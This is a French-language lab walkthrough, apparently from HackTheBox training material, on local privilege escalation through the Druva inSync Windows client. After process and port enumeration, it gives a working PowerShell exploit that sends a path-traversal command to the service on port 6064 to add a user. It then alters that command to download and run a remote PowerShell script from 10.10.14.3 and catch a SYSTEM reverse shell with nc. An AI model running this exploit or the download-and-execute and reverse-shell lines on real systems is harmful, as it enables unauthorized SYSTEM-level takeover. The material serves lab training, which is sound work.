# Vulnerable Installed Services

***

### <mark style="color:red;">Énumération des programmes installés</mark>

```
C:\htb> wmic product get name
```

### <mark style="color:red;">Énumération des ports locaux</mark>

```
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

### <mark style="color:red;">Énumération de l'ID de processus</mark>

```
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

### <mark style="color:red;">Énumération du service en cours d'exécution</mark>

```
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
```

### <mark style="color:red;">Exemple d'élévation de privilèges locale du client Windows Druva inSync</mark>

#### <mark style="color:green;">Preuve de concept PowerShell pour Druva inSync</mark>

Avec ces informations en main, essayons la preuve de concept d'exploit, qui est ce court extrait PowerShell.

{% code fullWidth="true" %}
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
{% endcode %}

#### <mark style="color:green;">Modification de la preuve de concept PowerShell</mark>

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modifiez la variable $cmd dans le script de preuve de concept d'exploit Druva inSync pour télécharger notre shell PowerShell inversé en mémoire.

{% code overflow="wrap" fullWidth="true" %}
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```
{% endcode %}

#### <mark style="color:green;">Démarrage d'un serveur web Python</mark>

```
mrroboteLiot_1@htb[/htb]$ python3 -m http.server 8080
```

#### <mark style="color:green;">Capture d'un shell SYSTEM</mark>

```
mrroboteLiot_1@htb[/htb]$ nc -lvnp 9443
```
